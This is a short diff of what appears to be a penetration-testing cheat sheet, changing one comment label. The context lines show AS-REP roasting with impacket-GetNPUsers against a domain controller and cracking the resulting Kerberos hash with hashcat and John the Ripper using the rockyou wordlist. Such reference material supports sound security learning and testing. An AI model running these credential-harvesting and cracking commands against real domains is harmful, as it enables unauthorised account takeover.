@@ -503,7 +503,7 @@ impacket-GetNPUsers vorkharium.com/john:'Password123!' -dc-ip 172.16.150.10 -req
 hashcat -m 18200 -a 0 jane_hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt
 
-# With John
+# With Johntheripper
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
 sudo john jane_hash.txt --show
 ```
